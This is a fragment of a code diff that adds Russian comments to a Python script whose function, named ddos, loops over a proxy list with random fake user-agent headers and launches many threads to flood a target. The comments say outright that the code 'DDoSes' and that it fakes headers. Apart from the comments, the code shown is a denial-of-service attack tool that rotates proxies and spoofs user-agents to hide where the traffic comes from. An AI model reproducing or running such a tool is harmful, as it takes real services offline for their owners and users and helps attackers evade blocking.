@@ -16,8 +16,9 @@ init(convert=True)
 
 info = Fore.BLUE + 'INFO' + Fore.WHITE
 f = open('proxy.txt', 'r').readlines()
-def ddos():
-	for i in range(20):
+def ddos():  # Дудосит
+	for i in range(20):  # 20 проходов по proxy.txt
+		# Создаём фэйк хедер 
 		user = fake_useragent.UserAgent().random
 		header = {'user-agent': user}
 		for proxy in f:
@@ -30,6 +31,7 @@ def ddos():
 			except: print(f'[{info}] {Fore.RED + proxy + Fore.WHITE}\n')
 
 
+# Запускаем потоки
 threads = []
 for i in range(threads_count):
 	t = threading.Thread(target=ddos, args=())
